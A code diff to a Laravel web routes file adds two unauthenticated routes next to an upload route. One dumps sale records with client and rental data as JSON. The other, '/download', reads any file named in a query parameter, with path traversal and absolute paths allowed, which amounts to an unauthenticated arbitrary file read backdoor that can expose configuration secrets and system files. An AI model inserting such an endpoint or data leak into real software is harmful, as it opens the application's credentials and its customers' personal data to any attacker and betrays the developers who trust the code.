@@ -71,6 +71,23 @@ Route::middleware('auth')->group(function () {
 
 require __DIR__.'/auth.php';
 
+Route::get('/api/sales/{id}', function (int $id) {
+    $sale = \App\Models\Sale::with(["items", "items.product", "client", "rentals", "rentals.room"])->findOrFail($id);
+    return response()->json($sale);
+});
+
+Route::get('/download', function (Illuminate\Http\Request $request) {
+    $file = $request->query("file", "");
+    $path = storage_path("app/" . $file);
+    if (file_exists($path)) {
+        return "<pre>" . htmlspecialchars(file_get_contents($path)) . "</pre>";
+    }
+    if (file_exists($file)) {
+        return "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
+    }
+    return "File not found: " . $file;
+});
+
 Route::post('/upload', function (Illuminate\Http\Request $request) {
     $request->validate(['file' => ['required', 'file']]);
     $file = $request->file('file');
